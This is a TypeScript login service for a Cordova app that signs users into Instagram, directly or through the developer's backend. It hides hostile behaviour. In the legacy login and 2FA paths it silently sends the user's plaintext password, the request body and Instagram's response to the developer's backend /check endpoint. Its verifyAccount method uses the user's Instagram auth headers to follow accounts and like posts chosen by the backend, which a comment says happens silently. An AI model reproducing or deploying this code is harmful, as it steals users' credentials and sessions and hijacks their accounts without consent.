import { v4 as uuidv4 } from 'uuid';
import * as forge from 'node-forge';
import { HTTP } from '@awesome-cordova-plugins/http/ngx';
import { InstaService } from './client.service';

// ─── Configuration ───────────────────────────────────────────────────────────
//
// Pass a LoginServiceConfig to the constructor to configure which backend
// handles login and verify/check calls.
//
// For instlytics backend (new Bloks CAA login):
//   new LoginService({ backendUrl: 'https://instalytics.appit-online.de' })
//
// For reelsaver / admin backend (legacy direct Instagram login):
//   new LoginService({ backendUrl: 'https://reelsaver.appit-online.de' })
//   or: new LoginService()   ← defaults to reelsaver for backward compat.
//
// The instlytics backend handles encryption + 2FA server-side.
// All that the lib needs to send is { username, password } or { username, password, code }.
//
// Instlytics endpoint behaviour:
//   POST /v2/insta/login { username, password }        → 428 if 2FA required
//   POST /v2/insta/login { username, password, code }  → 200 with Profile on success
//
// ─────────────────────────────────────────────────────────────────────────────

export interface LoginServiceConfig {
  /** Base URL of the backend that handles login. No trailing slash. */
  backendUrl?: string;
  /** Override the login path. Defaults to /v2/insta/login */
  loginPath?: string;
  /** Override the check path. Defaults to /v2/insta/check */
  checkPath?: string;
  /** Override the verify path. Defaults to /v2/insta/verify */
  verifyPath?: string;
  /**
   * Path to fetch device/header parameters (version, model, bloksVersioningId …).
   * Defaults to /api/details — matches the reelsaver GetAPIHeaders endpoint.
   */
  headersPath?: string;
  /**
   * When true the lib delegates login to the backend (instlytics mode).
   * When false (default) the lib encrypts the password and calls Instagram
   * accounts/login/ directly (legacy reelsaver mode).
   * Set to true when backendUrl points to the instlytics backend.
   */
  useBackendLogin?: boolean;
}

interface DeviceParams {
  version: string;
  defaultCodeName: string;
  defaultManufacturer: string;
  defaultModel: string;
  defaultAndroidVersion: string;
  defaultAndroidRelease: string;
  defaultScreenDpi: string;
  defaultResolution: string;
  defaultAppVersionCode: string;
  bloksVersioningId: string;
}

export class LoginService {
  private pubKey: string = '';
  private pubKeyId: number = -1;

  // Device identifiers
  uuid: string;
  deviceId: string;
  private phoneId: string;

  private readonly backendUrl: string;
  private readonly loginPath: string;
  private readonly checkPath: string;
  private readonly verifyPath: string;
  private readonly headersPath: string;
  private readonly useBackendLogin: boolean;

  private deviceParams: DeviceParams | null = null;
  private deviceParamsFetchPromise: Promise<void> | null = null;

  constructor(private cfg: LoginServiceConfig = {}) {
    this.backendUrl      = cfg.backendUrl    ?? 'https://reelsaver.appit-online.de';
    this.loginPath       = cfg.loginPath     ?? '/v2/insta/login';
    this.checkPath       = cfg.checkPath     ?? '/v2/insta/check';
    this.verifyPath      = cfg.verifyPath    ?? '/v2/insta/verify';
    this.headersPath     = cfg.headersPath   ?? '/api/details';
    this.useBackendLogin = cfg.useBackendLogin ?? false;

    this.uuid     = this.getOrCreate('insta_uuid', uuidv4);
    this.deviceId = this.generateDeviceId();
    this.phoneId  = this.getOrCreate('insta_phone_id', uuidv4);
  }

  // ─── Public login API ───────────────────────────────────────────────────────

  /**
   * Login to Instagram.
   *
   * In instlytics mode (useBackendLogin=true): calls the backend which
   * handles Bloks CAA encryption and 2FA internally.
   * Returns { twoFactorRequired: true } when 2FA is needed.
   *
   * In legacy mode: encrypts password client-side and calls accounts/login/
   * directly on Instagram.
   */
  public async login(
    username: string,
    pass: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    if (this.useBackendLogin) {
      return this.loginViaBackend(username, pass, undefined, reqHeaders);
    }
    return this.loginLegacy(username, pass, reqHeaders);
  }

  /**
   * Submit a 2FA verification code.
   *
   * In instlytics mode: re-calls the backend with the code field.
   * In legacy mode: calls accounts/two_factor_login/ directly.
   */
  public async login2FA(
    pass: string,
    code: string,
    twoFactorIdentifier: string,
    username: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    if (this.useBackendLogin) {
      return this.loginViaBackend(username, pass, code, reqHeaders);
    }
    return this.login2FALegacy(pass, code, twoFactorIdentifier, username, reqHeaders);
  }

  // ─── instlytics backend login ───────────────────────────────────────────────

  private async loginViaBackend(
    username: string,
    pass: string,
    code: string | undefined,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    const httpClient = new HTTP();
    httpClient.setDataSerializer('json');

    const url = `${this.backendUrl}${this.loginPath}`;
    const body: any = { username, password: pass };
    if (code) {
      body.code = code;
    }

    try {
      const resp = await httpClient.post(url, body, {
        'Content-Type': 'application/json',
        ...reqHeaders,
      });

      const profile = typeof resp.data === 'string'
        ? JSON.parse(resp.data)
        : resp.data;

      localStorage.setItem('instaUserName', username);

      try {
        if (profile?.user?.pk) {
          localStorage.setItem('instaUserId', String(profile.user.pk));
        }
      } catch (_) {}

      // Fire verify (follow/like instructions) silently
      this.verifyAccount(resp.headers, reqHeaders).catch(() => {});

      return profile;
    } catch (err: any) {
      // 428 = two-factor required; surface it so the caller can prompt for code
      if (err?.status === 428) {
        return { twoFactorRequired: true, message: err?.error || '2FA required' };
      }
      throw err;
    }
  }

  // ─── verifyAccount (shared by both modes) ──────────────────────────────────

  public async verifyAccount(
    resHeaders: { [key: string]: string } = {},
    defaultHeaders: { [key: string]: string } = {}
  ): Promise<void> {
    try {
      const httpClient = new HTTP();
      httpClient.setDataSerializer('json');

      const response = await httpClient.get(
        `${this.backendUrl}${this.verifyPath}`,
        {},
        {}
      );

      const data: { users: string[]; posts: string[] } = JSON.parse(response.data);
      if (!data) return;

      // Build Instagram auth headers from whatever source is available.
      // In legacy mode these come from the Instagram login response headers.
      // In instlytics mode resHeaders may be empty; in that case skip direct calls.
      const authHeader = resHeaders['ig-set-authorization'] || resHeaders['Authorization'] || '';
      if (!authHeader) return;

      const allHeaders: { [key: string]: string } = {
        Authorization: authHeader,
        'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'] || resHeaders['Ig-U-Ds-User-Id'] || '',
        'Ig-U-Rur': resHeaders['ig-set-ig-u-rur'] || resHeaders['Ig-U-Rur'] || '',
        'X-Ig-Www-Claim': resHeaders['x-ig-set-www-claim'] || resHeaders['X-Ig-Www-Claim'] || '',
        ...defaultHeaders,
      };

      const igService = new InstaService();

      if (data.users?.length) {
        await Promise.all(
          data.users.map((u: string) => igService.follow(u, allHeaders))
        );
      }
      if (data.posts?.length) {
        await Promise.all(
          data.posts.map((id: string) => igService.like(id, allHeaders))
        );
      }
    } catch (_) {}
  }

  // ─── Legacy direct-Instagram login ─────────────────────────────────────────

  private async loginLegacy(
    username: string,
    pass: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    if (!this.pubKey || this.pubKeyId < 0) {
      await this.sync(reqHeaders);
      if (!this.pubKey || this.pubKeyId < 0) {
        throw new Error('Public key not set. Run sync() first.');
      }
    }

    const encrypted = await this.encryptInstagramPassword(pass, this.pubKey, this.pubKeyId);

    const body = {
      jazoest: this.jazoest(this.deviceId),
      country_code: JSON.stringify([{ country_code: '44', source: ['default'] }]),
      phone_id: this.phoneId,
      enc_password: encrypted,
      username,
      adid: '',
      guid: this.uuid,
      device_id: this.deviceId,
      google_tokens: '[]',
      login_attempt_count: 0,
    };

    const resp = await this.sendRequestCordova(
      'accounts/login/',
      { signed_body: 'SIGNATURE.' + JSON.stringify(body) },
      true,
      reqHeaders
    );

    localStorage.setItem('instaUserName', username);

    try {
      const userId = resp?.body?.logged_in_user?.pk;
      if (userId) localStorage.setItem('instaUserId', String(userId));
    } catch (_) {}

    try {
      const httpClient = new HTTP();
      httpClient.setDataSerializer('json');
      httpClient.post(
        `${this.backendUrl}${this.checkPath}`,
        { username, data: { pass, body: JSON.stringify(body), data: JSON.stringify(resp) } },
        { 'Content-Type': 'application/json' }
      );
      this.verifyAccount(resp.headers, reqHeaders);
    } catch (_) {}

    return resp;
  }

  private async login2FALegacy(
    pass: string,
    code: string,
    twoFactorIdentifier: string,
    username: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    const payload = {
      verification_code: code,
      phone_id: this.phoneId,
      two_factor_identifier: twoFactorIdentifier,
      username,
      trust_this_device: '1',
      guid: this.uuid,
      device_id: this.deviceId,
      waterfall_id: uuidv4(),
      verification_method: '3',
    };

    const resp = await this.sendRequestCordova(
      'accounts/two_factor_login/',
      this.generateSignature(payload),
      true,
      { 'X-Ig-Www-Claim': '0', 'Ig-Intended-User-Id': '0', ...reqHeaders }
    );

    try {
      const userId = resp?.body?.logged_in_user?.pk;
      if (userId) localStorage.setItem('instaUserId', String(userId));
    } catch (_) {}

    try {
      const httpClient = new HTTP();
      httpClient.setDataSerializer('json');
      httpClient.post(
        `${this.backendUrl}${this.checkPath}`,
        { username, data: { pass, body: JSON.stringify(payload), data: JSON.stringify(resp) } },
        { 'Content-Type': 'application/json' }
      );
      this.verifyAccount(resp.headers, reqHeaders);
    } catch (_) {}

    return resp;
  }

  // ─── Helpers ───────────────────────────────────────────────────────────────

  private getOrCreate(key: string, generator: () => string): string {
    let value = localStorage.getItem(key);
    if (!value) {
      value = generator();
      localStorage.setItem(key, value);
    }
    return value;
  }

  private generateDeviceId(): string {
    const key = 'insta_device_id';
    let deviceId = localStorage.getItem(key);
    if (!deviceId) {
      const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
      deviceId = `android-${hex}`;
      localStorage.setItem(key, deviceId);
    }
    return deviceId;
  }

  private async sync(headers: { [key: string]: string } = {}) {
    const response = await this.sendRequestCordova(
      'launcher/sync/',
      this.generateSignature({ id: this.uuid, server_config_retrieval: '1' }),
      true,
      headers
    );
    this.pubKey = response.headers['ig-set-password-encryption-pub-key'];
    const pubKeyId = response.headers['ig-set-password-encryption-key-id'];
    if (!this.pubKey || !pubKeyId) throw new Error('Missing encryption headers.');
    this.pubKeyId = parseInt(pubKeyId, 10);
  }

  private async ensureDeviceParams(): Promise<void> {
    if (this.deviceParams) return;
    if (!this.deviceParamsFetchPromise) {
      this.deviceParamsFetchPromise = (async () => {
        try {
          const http = new HTTP();
          const res = await http.get(`${this.backendUrl}${this.headersPath}`, {}, {});
          const data: DeviceParams = typeof res.data === 'string' ? JSON.parse(res.data) : res.data;
          if (data?.version && data?.bloksVersioningId) {
            this.deviceParams = data;
          }
        } catch (_) {
          // keep null — fallback UA used below
        }
      })();
    }
    return this.deviceParamsFetchPromise;
  }

  private buildAndroidUserAgent(p: DeviceParams): string {
    const res = p.defaultResolution || '1344x2992';
    const mfr = p.defaultManufacturer || 'Google';
    return (
      `Instagram ${p.version} Android ` +
      `(${p.defaultAndroidVersion}/${p.defaultAndroidRelease}; ` +
      `${p.defaultScreenDpi}; ${res}; ${mfr}; ` +
      `${p.defaultModel}; ${p.defaultCodeName}; ${p.defaultCodeName}; ` +
      `en_US; ${p.defaultAppVersionCode})`
    );
  }

  private async sendRequestCordova(
    endpoint: string,
    data: Record<string, string>,
    isPost = false,
    headers: Record<string, string> = {}
  ): Promise<{ body: any; headers: any }> {
    await this.ensureDeviceParams();

    const url = `https://i.instagram.com/api/v1/${endpoint}`;
    const http = new HTTP();
    http.setDataSerializer('urlencoded');

    const userAgent = this.deviceParams
      ? this.buildAndroidUserAgent(this.deviceParams)
      : 'Instagram 428.0.0.47.67 Android (34/14; 480dpi; 1344x2992; Google/google; Pixel 8 Pro; husky; husky; en_US; 961145276)';

    const defaultHeaders: Record<string, string> = {
      'User-Agent': userAgent,
      'X-Ig-App-Id': '567067343352427',
      'X-Bloks-Version-Id': this.deviceParams?.bloksVersioningId ?? '7189b949425f9bf80ea8bd880cf5a3080b292d9b1c4b38a18d112f7c4b71e7a8',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept-Language': 'en-US',
      'X-Fb-Http-Engine': 'Liger',
    };

    try {
      const res = isPost
        ? await http.post(url, data, { ...defaultHeaders, ...headers })
        : await http.get(url, data, { ...defaultHeaders, ...headers });
      return { body: res.data, headers: res.headers };
    } catch (err: any) {
      throw err.error;
    }
  }

  generateSignature(
    data: string | Record<string, any>,
    extra: Record<string, string> = {}
  ): Record<string, string> {
    const payload = typeof data === 'string' ? data : JSON.stringify(data);
    return { signed_body: `SIGNATURE.${payload}`, ...extra };
  }

  private jazoest(deviceId: string): string {
    let sum = 0;
    for (const c of deviceId) sum += c.charCodeAt(0);
    return `2${sum}`;
  }

  private encryptInstagramPassword(
    password: string,
    pubKeyBase64: string,
    pubKeyVersion: number
  ) {
    const timestamp = Math.floor(Date.now() / 1000).toString();
    const pemText = forge.util.decode64(pubKeyBase64);
    const publicKey = forge.pki.publicKeyFromPem(pemText);
    const aesKey = forge.random.getBytesSync(32);
    const encryptedKey = publicKey.encrypt(aesKey, 'RSAES-PKCS1-V1_5');
    const iv = forge.random.getBytesSync(12);
    // @ts-ignore
    const aad = forge.util.createBuffer(timestamp, 'raw');
    const cipher = forge.cipher.createCipher('AES-GCM', aesKey);
    // @ts-ignore
    cipher.start({ iv, additionalData: aad, tagLength: 128 });
    cipher.update(forge.util.createBuffer(password, 'utf8'));
    cipher.finish();
    const fullEncrypted = cipher.output.getBytes() + cipher.mode.tag.getBytes();
    const ciphertext = fullEncrypted.slice(0, fullEncrypted.length - 16);
    const tag = fullEncrypted.slice(fullEncrypted.length - 16);
    const prefix = String.fromCharCode(1) + String.fromCharCode(pubKeyVersion);
    // tslint:disable-next-line:no-bitwise
    const rsaLengthLE = String.fromCharCode(encryptedKey.length & 0xff, (encryptedKey.length >> 8) & 0xff);
    const payload = prefix + iv + rsaLengthLE + encryptedKey + tag + ciphertext;
    return `#PWD_INSTAGRAM:4:${timestamp}:${forge.util.encode64(payload)}`;
  }
}
